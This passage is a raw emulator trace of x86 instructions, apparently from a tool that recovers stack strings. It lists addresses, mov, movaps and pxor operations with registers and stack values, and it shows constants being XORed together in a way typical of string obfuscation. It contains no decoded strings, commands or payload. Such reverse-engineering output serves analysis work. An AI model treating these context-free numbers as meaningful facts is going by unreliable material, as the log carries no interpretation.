saving data to stack: 1896688528 4 0x45abff: mov dword ptr [esp + 0xa8], 0x3769ce16, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x80a8 for stack size 0x10000 saving data to stack: 929680918 4 0x45ac0a: mov dword ptr [esp + 0xac], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x12c and offset 0x80ac for stack size 0x10000 saving data to stack: 1389027477 4 0x45ac11: movaps xmm1, xmmword ptr [esp + 0xa0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x12c and offset 0x80a0 for stack size 0x10000 0x45ac19: mov dword ptr [esp + 0x120], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8120 for stack size 0x10000 saving data to stack: 914789047 4 0x45ac24: mov dword ptr [esp + 0x124], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8124 for stack size 0x10000 saving data to stack: 896093928 4 0x45ac2f: mov dword ptr [esp + 0x128], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8128 for stack size 0x10000 saving data to stack: 929680980 4 0x45ac3a: mov dword ptr [esp + 0x12c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x12c and offset 0x812c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ac41: pxor xmm1, xmmword ptr [esp + 0x120], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x12c and offset 0x8120 for stack size 0x10000 0x45ac4a: movaps xmmword ptr [esp + 0xa0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x12c and offset 0x80a0 for stack size 0x10000 saving data to stack: 1222413284324852133449 16 0x45ac5c: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45ac63: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45ac68: mov dword ptr [esp + 0x98], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x12c and offset 0x8098 for stack size 0x10000 saving data to stack: 929680980 4 0x45ac6f: mov dword ptr [esp + 0x90], 0x55e8ebe4, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8090 for stack size 0x10000 saving data to stack: 1441328100 4 0x45ac7a: mov dword ptr [esp + 0x94], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x12c and offset 0x8094 for stack size 0x10000 saving data to stack: 896093928 4 0x45ac81: mov dword ptr [esp + 0x9c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x12c and offset 0x809c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ac88: movaps xmm1, xmmword ptr [esp + 0x90], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x12c and offset 0x8090 for stack size 0x10000 0x45ac90: mov dword ptr [esp + 0x118], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x12c and offset 0x8118 for stack size 0x10000 saving data to stack: 929680980 4 0x45ac9e: mov dword ptr [esp + 0x110], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8110 for stack size 0x10000 saving data to stack: 914789047 4 0x45aca9: mov dword ptr [esp + 0x114], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x12c and offset 0x8114 for stack size 0x10000 saving data to stack: 896093928 4 0x45acb0: mov dword ptr [esp + 0x11c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x12c and offset 0x811c for stack size 0x10000 saving data to stack: 1389027477 4 0x45acb7: pxor xmm1, xmmword ptr [esp + 0x110], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x12c and offset 0x8110 for stack size 0x10000 0x45acc0: movaps xmmword ptr [esp + 0x90], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x12c and offset 0x8090 for stack size 0x10000 saving data to stack: 1668184403 16 0x45acca: mov dword ptr [esp + 0x88], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x12c and offset 0x8088 for stack size 0x10000 saving data to stack: 929680980 4 0x45acd1: mov dword ptr [esp + 0x80], 0x57e5fdfb, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8080 for stack size 0x10000 saving data to stack: 1474690555 4 0x45acdc: mov dword ptr [esp + 0x84], 0x35694e84, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8084 for stack size 0x10000 saving data to stack: 896093828 4 0x45ace7: mov dword ptr [esp + 0x8c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x12c and offset 0x808c for stack size 0x10000 saving data to stack: 1389027477 4 0x45acee: movaps xmm1, xmmword ptr [esp + 0x80], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x12c and offset 0x8080 for stack size 0x10000 0x45acf6: mov dword ptr [esp + 0x108], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x12c and offset 0x8108 for stack size 0x10000 saving data to stack: 929680980 4 0x45ad04: mov dword ptr [esp + 0x100], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8100 for stack size 0x10000 saving data to stack: 914789047 4 0x45ad0f: mov dword ptr [esp + 0x104], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8104 for stack size 0x10000 saving data to stack: 896093928 4 0x45ad1a: mov dword ptr [esp + 0x10c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x12c and offset 0x810c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ad21: pxor xmm1, xmmword ptr [esp + 0x100], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x12c and offset 0x8100 for stack size 0x10000 0x45ad2a: movaps xmmword ptr [esp + 0x80], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x12c and offset 0x8080 for stack size 0x10000 saving data to stack: 465490374476 16 0x45ad32: push eax, regs_read: [30, 19], regs_write: [30] 0x45ad3f: mov esi, eax, regs_read: [19], regs_write: [29] 0x45ad41: mov dword ptr [esp + 0xf0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x80f0 for stack size 0x10000 saving data to stack: 914789047 4 0x45ad4c: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45ad51: mov dword ptr [esp + 0x40], 0x368692eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x8040 for stack size 0x10000 saving data to stack: 914789099 4 0x45ad59: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45ad5e: mov dword ptr [esp + 0xf4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x130 and offset 0x80f4 for stack size 0x10000 saving data to stack: 896093928 4 0x45ad65: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45ad6a: mov dword ptr [esp + 0xf8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x130 and offset 0x80f8 for stack size 0x10000 saving data to stack: 929680980 4 0x45ad71: mov dword ptr [esp + 0xfc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x130 and offset 0x80fc for stack size 0x10000 saving data to stack: 1389027477 4 0x45ad78: movaps xmm1, xmmword ptr [esp + 0xf0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x130 and offset 0x80f0 for stack size 0x10000 0x45ad80: mov dword ptr [esp + 0x4c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x130 and offset 0x804c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ad88: mov dword ptr [esp + 0x44], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x130 and offset 0x8044 for stack size 0x10000 saving data to stack: 896093928 4 0x45ad90: mov dword ptr [esp + 0x48], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x130 and offset 0x8048 for stack size 0x10000 saving data to stack: 929680980 4 0x45ad98: pxor xmm1, xmmword ptr [esp + 0x40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x130 and offset 0x8040 for stack size 0x10000 0x45ad9e: push eax, regs_read: [30, 19], regs_write: [30] 0x45ad9f: movaps xmmword ptr [esp + 0x44], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x134 and offset 0x8044 for stack size 0x10000 saving data to stack: 92 16 0x45ada9: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45adaa: push esi, regs_read: [30, 29], regs_write: [30] 0x45adab: push eax, regs_read: [30, 19], regs_write: [30] 0x45adac: push dword ptr [esp + 0x14], regs_read: [30], regs_write: [30] 0x45adc3: push eax, regs_read: [30, 19], regs_write: [30] 0x45ae0e: push 0, regs_read: [30], regs_write: [30] 0x45ae15: push eax, regs_read: [30, 19], regs_write: [30] 0x45ae23: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x148 and offset 0x8000 for stack size 0x10000 0x45ae25: push eax, regs_read: [30, 19], regs_write: [30] 0x45ae35: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x14c and offset 0x8000 for stack size 0x10000 0x45ae37: push eax, regs_read: [30, 19], regs_write: [30] 0x45ae4e: push 1, regs_read: [30], regs_write: [30] 0x45ae50: pop eax, regs_read: [30], regs_write: [30, 19] 0x45ae54: mov byte ptr [esp + 9], cl, regs_read: [30, 10], regs_write: () adjusting stack for ESP -0x150 and offset 0x8009 for stack size 0x10000 saving data to stack: 0 1 0x45ae58: mov esi, dword ptr [esp + 0xc], regs_read: [30], regs_write: [29] adjusting stack for ESP -0x150 and offset 0x800c for stack size 0x10000 0x45ae95: mov ecx, dword ptr [0x4f0704], regs_read: (), regs_write: [22] 0x45ae9b: push 0x64, regs_read: [30], regs_write: [30] 0x45ae9d: pop eax, regs_read: [30], regs_write: [30, 19] 0x45aea4: mov eax, dword ptr [0x4f0708], regs_read: (), regs_write: [19] 0x45aeab: mov dword ptr [esp + 0xc], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x150 and offset 0x800c for stack size 0x10000 saving data to stack: 0 4 0x45aec8: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x150 and offset 0x8000 for stack size 0x10000 0x45aeca: push eax, regs_read: [30, 19], regs_write: [30] 0x45aee3: push ecx, regs_read: [30, 22], regs_write: [30] 0x45aef0: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45af15: pop edi, regs_read: [30], regs_write: [30, 23] 0x45af18: pop esi, regs_read: [30], regs_write: [30, 29] 0x45af19: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x14c and offset 0x8000 for stack size 0x10000 0x45af1b: pop ebp, regs_read: [30], regs_write: [30, 20] 0x45af29: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x45af2b: push 0x4f05f0, regs_read: [30], regs_write: [30] 0x45af40: push ebp, regs_read: [30, 20], regs_write: [30] 0x45af41: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x4 and offset 0x8000 for stack size 0x10000 0x45af4c: push esi, regs_read: [30, 29], regs_write: [30] 0x45af4d: push edi, regs_read: [30, 23], regs_write: [30] 0x45af50: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45af5c: mov esi, 0x52cae095, regs_read: (), regs_write: [29] 0x45af61: mov dword ptr [esp + 0x18], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x8018 for stack size 0x10000 saving data to stack: 1389027477 4 0x45af6b: mov dword ptr [esp + 0x28], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x8028 for stack size 0x10000 saving data to stack: 929680980 4 0x45af76: mov dword ptr [esp + 0x68], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x8068 for stack size 0x10000 saving data to stack: 929680980 4 0x45af7a: mov edx, 0x4f05f0, regs_read: (), regs_write: [24] 0x45af7f: mov dword ptr [esp + 0x20], 0x45efdaeb, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x8020 for stack size 0x10000 saving data to stack: 1173347051 4 0x45af8b: mov dword ptr [esp + 0x24], 0x4c1b219c, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x8024 for stack size 0x10000 saving data to stack: 1276846492 4 0x45af93: mov dword ptr [esp + 0x2c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x802c for stack size 0x10000 saving data to stack: 1389027477 4 0x45af97: mov dword ptr [esp + 0x60], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x8060 for stack size 0x10000 saving data to stack: 914789047 4 0x45af9f: mov dword ptr [esp + 0x64], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x8064 for stack size 0x10000 saving data to stack: 896093928 4 0x45afa7: mov dword ptr [esp + 0x6c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x806c for stack size 0x10000 saving data to stack: 1389027477 4 0x45afab: movaps xmm1, xmmword ptr [esp + 0x60], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8060 for stack size 0x10000 0x45afb0: pxor xmm1, xmmword ptr [esp + 0x20], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8020 for stack size 0x10000 0x45afb6: push eax, regs_read: [30, 19], regs_write: [30] 0x45afb7: movaps xmmword ptr [esp + 0x24], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x10 and offset 0x8024 for stack size 0x10000 saving data to stack: 8751179571877464156 16 0x45afd0: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45afd9: push edi, regs_read: [30, 23], regs_write: [30] 0x45afda: push eax, regs_read: [30, 19], regs_write: [30] 0x45afe9: mov ecx, 0x4f0778, regs_read: (), regs_write: [22] 0x45afee: mov byte ptr [esp + 0x17], 0, regs_read: [30], regs_write: () adjusting stack for ESP -0x14 and offset 0x8017 for stack size 0x10000 saving data to stack: 0 1 0x45b013: mov ecx, 0x4f0778, regs_read: (), regs_write: [22] 0x45b01d: mov eax, dword ptr [esp + 0xa8], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x14 and offset 0x80a8 for stack size 0x10000 0x45b024: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x45b026: mov dword ptr [esp + 0x1c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x14 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b037: mov dword ptr [esp + 0x74], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x14 and offset 0x8074 for stack size 0x10000 saving data to stack: 1389027477 4 0x45b047: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b05d: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b05f: push eax, regs_read: [30, 19], regs_write: [30] 0x45b06c: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b06e: push eax, regs_read: [30, 19], regs_write: [30] 0x45b089: mov esi, eax, regs_read: [19], regs_write: [29] 0x45b094: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b09b: mov eax, dword ptr [esp + 0x78], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x8078 for stack size 0x10000 0x45b09f: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x45b0a1: mov dword ptr [esp + 0x5c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x805c for stack size 0x10000 saving data to stack: 929680980 4 0x45b0b0: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b0c8: mov dword ptr [esp + 0x20], 0x368692e8, regs_read: [30], regs_write: () adjusting stack for ESP -0x1c and offset 0x8020 for stack size 0x10000 saving data to stack: 914789096 4 0x45b0d0: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45b0d5: mov dword ptr [esp + 0x18], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x1c and offset 0x8018 for stack size 0x10000 saving data to stack: 1389027477 4 0x45b0d9: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45b0de: mov dword ptr [esp + 0x68], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x8068 for stack size 0x10000 saving data to stack: 929680980 4 0x45b0e2: mov edi, 0x35694ee8, regs_read: (), regs_write: [23] 0x45b0e7: mov dword ptr [esp + 0x28], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x8028 for stack size 0x10000 saving data to stack: 929680980 4 0x45b0eb: mov dword ptr [esp + 0x6c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x806c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b0f6: mov dword ptr [esp + 0x24], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x1c and offset 0x8024 for stack size 0x10000 saving data to stack: 896093928 4 0x45b0fa: mov dword ptr [esp + 0x2c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x802c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b0fe: mov dword ptr [esp + 0x60], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x1c and offset 0x8060 for stack size 0x10000 saving data to stack: 914789047 4 0x45b106: mov dword ptr [esp + 0x64], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x1c and offset 0x8064 for stack size 0x10000 saving data to stack: 896093928 4 0x45b10a: movaps xmm1, xmmword ptr [esp + 0x60], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8060 for stack size 0x10000 0x45b10f: pxor xmm1, xmmword ptr [esp + 0x20], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8020 for stack size 0x10000 0x45b115: push edx, regs_read: [30, 24], regs_write: [30] 0x45b11a: movaps xmmword ptr [esp + 0x24], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x20 and offset 0x8024 for stack size 0x10000 saving data to stack: 95 16 0x45b124: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45b131: push 0x4dc59e, regs_read: [30], regs_write: [30] 0x45b136: mov dword ptr [esp + 0x1c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x20 and offset 0x801c for stack size 0x10000 saving data to stack: 896093928 4 0x45b13f: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45b144: mov dword ptr [esp + 0x1c0], 0x3686f0c0, regs_read: [30], regs_write: () adjusting stack for ESP -0x20 and offset 0x81c0 for stack size 0x10000 saving data to stack: 914813120 4 0x45b14f: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45b154: mov dword ptr [esp + 0x1c4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x20 and offset 0x81c4 for stack size 0x10000 saving data to stack: 896093928 4 0x45b15b: mov dword ptr [esp + 0x1c8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x20 and offset 0x81c8 for stack size 0x10000 saving data to stack: 929680980 4 0x45b162: mov edi, eax, regs_read: [19], regs_write: [23] 0x45b164: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45b169: mov dword ptr [esp + 0xb4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x20 and offset 0x80b4 for stack size 0x10000 saving data to stack: 896093928 4 0x45b170: mov dword ptr [esp + 0x1cc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x20 and offset 0x81cc for stack size 0x10000 saving data to stack: 1389027477 4 0x45b177: mov dword ptr [esp + 0xb8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x20 and offset 0x80b8 for stack size 0x10000 saving data to stack: 929680980 4 0x45b17e: mov dword ptr [esp + 0xbc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x20 and offset 0x80bc for stack size 0x10000 saving data to stack: 1389027477 4 0x45b185: mov dword ptr [esp + 0xb0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x20 and offset 0x80b0 for stack size 0x10000 saving data to stack: 914789047 4 0x45b190: movaps xmm1, xmmword ptr [esp + 0xb0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x20 and offset 0x80b0 for stack size 0x10000 0x45b198: pxor xmm1, xmmword ptr [esp + 0x1c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x20 and offset 0x81c0 for stack size 0x10000 0x45b1a1: movaps xmmword ptr [esp + 0x1c0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x20 and offset 0x81c0 for stack size 0x10000 saving data to stack: 25207 16 0x45b1a9: mov dword ptr [esp + 0x144], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x20 and offset 0x8144 for stack size 0x10000 saving data to stack: 896093928 4 0x45b1b0: mov dword ptr [esp + 0x148], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x20 and offset 0x8148 for stack size 0x10000 saving data to stack: 929680980 4 0x45b1b7: mov dword ptr [esp + 0x14c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x20 and offset 0x814c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b1be: mov dword ptr [esp + 0x1d4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x20 and offset 0x81d4 for stack size 0x10000 saving data to stack: 896093928 4 0x45b1c5: mov dword ptr [esp + 0x1d8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x20 and offset 0x81d8 for stack size 0x10000 saving data to stack: 929680980 4 0x45b1cc: mov dword ptr [esp + 0x1dc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x20 and offset 0x81dc for stack size 0x10000 saving data to stack: 1389027477 4 0x45b1d3: mov dword ptr [esp + 0x140], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x20 and offset 0x8140 for stack size 0x10000 saving data to stack: 914789047 4 0x45b1de: movaps xmm1, xmmword ptr [esp + 0x140], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x20 and offset 0x8140 for stack size 0x10000 0x45b1e6: mov dword ptr [esp + 0x1d0], 0x42fee699, regs_read: [30], regs_write: () adjusting stack for ESP -0x20 and offset 0x81d0 for stack size 0x10000 saving data to stack: 1124001433 4 0x45b1f1: pxor xmm1, xmmword ptr [esp + 0x1d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x20 and offset 0x81d0 for stack size 0x10000 0x45b1fa: movaps xmmword ptr [esp + 0x1d0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x20 and offset 0x81d0 for stack size 0x10000 saving data to stack: 1954051118 16 0x45b202: mov dword ptr [esp + 0x8c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x20 and offset 0x808c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b209: mov dword ptr [esp + 0x134], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x20 and offset 0x8134 for stack size 0x10000 saving data to stack: 896093928 4 0x45b210: mov dword ptr [esp + 0x138], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x20 and offset 0x8138 for stack size 0x10000 saving data to stack: 929680980 4 0x45b217: mov dword ptr [esp + 0x13c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x20 and offset 0x813c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b225: mov dword ptr [esp + 0x84], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x20 and offset 0x8084 for stack size 0x10000 saving data to stack: 896093928 4 0x45b233: mov dword ptr [esp + 0x88], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x20 and offset 0x8088 for stack size 0x10000 saving data to stack: 929680980 4 0x45b241: mov dword ptr [esp + 0x80], 0x368692eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x20 and offset 0x8080 for stack size 0x10000 saving data to stack: 914789099 4 0x45b24c: mov dword ptr [esp + 0x130], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x20 and offset 0x8130 for stack size 0x10000 saving data to stack: 914789047 4 0x45b257: movaps xmm1, xmmword ptr [esp + 0x130], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x20 and offset 0x8130 for stack size 0x10000 0x45b25f: pxor xmm1, xmmword ptr [esp + 0x80], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x20 and offset 0x8080 for stack size 0x10000 0x45b268: push eax, regs_read: [30, 19], regs_write: [30] 0x45b269: movaps xmmword ptr [esp + 0x84], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x24 and offset 0x8084 for stack size 0x10000 saving data to stack: 92 16 0x45b276: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45b277: push dword ptr [esp + 0x74], regs_read: [30], regs_write: [30] 0x45b27b: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45b282: push eax, regs_read: [30, 19], regs_write: [30] 0x45b28f: push edi, regs_read: [30, 23], regs_write: [30] 0x45b297: push eax, regs_read: [30, 19], regs_write: [30] 0x45b298: push dword ptr [esp + 0x80], regs_read: [30], regs_write: [30] 0x45b2b2: push eax, regs_read: [30, 19], regs_write: [30] 0x45b2bf: push eax, regs_read: [30, 19], regs_write: [30] 0x45b2ea: push ecx, regs_read: [30, 22], regs_write: [30] 0x45b2eb: push eax, regs_read: [30, 19], regs_write: [30] 0x45b2f1: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45b2f2: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45b2fa: mov edi, eax, regs_read: [19], regs_write: [23] 0x45b325: mov eax, dword ptr [esp + 0x18], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x3c and offset 0x8018 for stack size 0x10000 0x45b337: mov dword ptr [esp + 0x18], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x3c and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x45b340: mov eax, dword ptr [esp + 0x18], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x3c and offset 0x8018 for stack size 0x10000 0x45b352: mov dword ptr [esp + 0x18], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x3c and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x45b36a: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b36c: push eax, regs_read: [30, 19], regs_write: [30] 0x45b379: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b37b: push eax, regs_read: [30, 19], regs_write: [30] 0x45b388: push eax, regs_read: [30, 19], regs_write: [30] 0x45b39d: mov esi, 0x368692b7, regs_read: (), regs_write: [29] 0x45b3a2: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45b3a7: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45b3ac: mov dword ptr [esp + 0x120], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x48 and offset 0x8120 for stack size 0x10000 saving data to stack: 914789047 4 0x45b3b3: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45b3b8: mov dword ptr [esp + 0x124], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x48 and offset 0x8124 for stack size 0x10000 saving data to stack: 896093928 4 0x45b3bf: mov dword ptr [esp + 0x128], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x48 and offset 0x8128 for stack size 0x10000 saving data to stack: 929680980 4 0x45b3c6: mov dword ptr [esp + 0x12c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x48 and offset 0x812c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b3cd: mov dword ptr [esp + 0x100], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x48 and offset 0x8100 for stack size 0x10000 saving data to stack: 914789047 4 0x45b3d4: mov dword ptr [esp + 0x104], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x48 and offset 0x8104 for stack size 0x10000 saving data to stack: 896093928 4 0x45b3db: mov dword ptr [esp + 0x108], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x48 and offset 0x8108 for stack size 0x10000 saving data to stack: 929680980 4 0x45b3e2: mov dword ptr [esp + 0x10c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x48 and offset 0x810c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b3e9: mov dword ptr [esp + 0xc0], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x48 and offset 0x80c0 for stack size 0x10000 saving data to stack: 914789047 4 0x45b3f0: mov dword ptr [esp + 0xc4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x48 and offset 0x80c4 for stack size 0x10000 saving data to stack: 896093928 4 0x45b3f7: mov dword ptr [esp + 0xc8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x48 and offset 0x80c8 for stack size 0x10000 saving data to stack: 929680980 4 0x45b3fe: mov dword ptr [esp + 0xcc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x48 and offset 0x80cc for stack size 0x10000 saving data to stack: 1389027477 4 0x45b411: push 0x4dc59f, regs_read: [30], regs_write: [30] 0x45b41d: mov esi, eax, regs_read: [19], regs_write: [29] 0x45b424: movaps xmm1, xmmword ptr [esp + 0x120], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4c and offset 0x8120 for stack size 0x10000 0x45b433: mov dword ptr [esp + 0x1b0], 0x36eae0c2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x81b0 for stack size 0x10000 saving data to stack: 921362626 4 0x45b441: mov dword ptr [esp + 0x1b4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x81b4 for stack size 0x10000 saving data to stack: 896093928 4 0x45b44c: mov 